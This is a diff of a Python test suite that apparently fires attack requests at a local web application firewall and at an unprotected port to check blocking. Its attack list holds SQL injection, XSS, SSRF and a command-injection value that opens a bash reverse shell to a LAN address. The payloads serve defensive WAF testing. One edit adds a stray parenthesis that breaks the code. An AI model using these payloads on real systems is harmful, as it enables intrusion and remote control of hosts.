@@ -1,16 +1,3 @@
-"""
-Usage:
-  python lan_attack_test.py --target 192.168.1.1 --port 80
-  python lan_attack_test.py --target 192.168.1.1 --mode full
-  python lan_attack_test.py --target 192.168.1.1 --category sqli
-  python lan_attack_test.py --target 192.168.1.1 --category safe
-  python lan_attack_test.py --target 192.168.1.1 --mode compare
-    (compare WAF :80 vs unprotected :8080)
-
-Requirements:
-  pip install requests
-"""
-
 import argparse
 import time
 import json
@@ -75,7 +62,7 @@ ATTACKS = [
      "GET", "/api/users", {"role": "admin' UNION SELECT 1,2,3,4--"},
      "BLOCKED", "sqli"),
 
-    #XSS
+    # ── XSS ───────────────────────────────────────────────────────────────
     ("XSS – Script Tag",
      "GET", "/profile", {"name": "<script>alert('XSS')</script>"},
      "BLOCKED", "xss"),
@@ -138,7 +125,7 @@ ATTACKS = [
      "GET", "/ping", {"host": "127.0.0.1; bash -i >& /dev/tcp/192.168.1.2/4444 0>&1"},
      "BLOCKED", "cmd"),
 
-    #SSRF
+    #SSRF 
     ("SSRF – Localhost",
      "GET", "/fetch", {"url": "http://localhost:8080/api/status"},
      "BLOCKED", "ssrf"),
@@ -268,11 +255,12 @@ def run_compare(waf_url: str, direct_url: str, delay: float):
     Run same attacks against both WAF and direct target.
     Shows the contrast: unprotected app is vulnerable, WAF blocks.
     """
-    
+    )
     print(bold(c("cyan", "  COMPARE MODE: WAF vs Unprotected")))
     print(bold(f"  WAF    : {waf_url}"))
     print(bold(f"  Direct : {direct_url}  (no WAF, completely vulnerable)"))
-   
+    
+
     compare_attacks = [
         ("SQLi – Union Select",
          "GET", "/search", {"q": "' UNION SELECT id,username,password,email,role FROM users--"}),
@@ -306,7 +294,7 @@ def run_compare(waf_url: str, direct_url: str, delay: float):
             print(f"    WAF    : {waf_str}")
             print(f"    Direct : {direct_str}")
 
-            # For SQLi auth bypass, show what the direct app actually returns
+            #For SQLi auth bypass, show what the direct app actually returns
             if name == "SQLi – Auth Bypass" and not direct_blocked:
                 try:
                     if "SUCCESS" in r_direct.text:
@@ -356,20 +344,20 @@ def main():
     direct_url = f"http://{args.target}:{args.direct_port}"
 
     
-    print(bold(c("cyan", " ShadowGuard: LAN Attack Test Suite")))
-    print(bold(f"{'═'*70}"))
+    print(bold(c("cyan", "ShadowGuard: LAN Attack Test Suite")))
+    
     print(f"  WAF target : {c('cyan', base_url)}")
     print(f"  Mode       : {args.mode}")
     print(f"  Time       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    
+   
 
-    #Compare mode: show the dramatic before/after
+    # Compare mode: show the dramatic before/after
     if args.mode == "compare":
         run_compare(base_url, direct_url, args.delay)
         run_rate_limit_test(base_url)
         return
 
-    #Filter attacks by category
+    # Filter attacks by category
     attacks = ATTACKS
     if args.category != "all":
         attacks = [a for a in ATTACKS if a[5] == args.category]
@@ -396,11 +384,11 @@ def main():
         results.append(r)
         categories.setdefault(category, []).append(r)
 
-    #Rate limit test in full mode
+    # Rate limit test in full mode
     if args.mode == "full":
         run_rate_limit_test(base_url)
 
-    #Summary
+    # Summary
     passed   = sum(1 for r in results if r["passed"])
     total    = len(results)
     attacks_blocked  = sum(1 for r in results if r["expected"] == "BLOCKED" and r["passed"])
@@ -429,20 +417,20 @@ def main():
         col = "green" if p == t else "yellow" if p >= t * 0.7 else "red"
         print(f"  {cat:<10} {c(col, bar)} {p}/{t}")
 
-   
+    
 
     if false_positives == 0 and false_negatives == 0:
         print(c("green", bold("  PERFECT — WAF blocked all attacks, passed all safe requests. 🛡️")))
     elif false_positives > 0:
-        print(c("yellow", f"  ⚠️  {false_positives} safe request(s) wrongly blocked. "
+        print(c("yellow", f"{false_positives} safe request(s) wrongly blocked. "
                           f"Check WAF threshold or rule tuning."))
     elif false_negatives > 0:
-        print(c("red",    f"  ⚠️  {false_negatives} attack(s) got through. "
+        print(c("red",    f"{false_negatives} attack(s) got through. "
                           f"Lower ML threshold or add specific rules."))
 
     
 
-    #Save results
+    # Save results
     out = {
         "timestamp": datetime.now().isoformat(),
         "target": base_url,
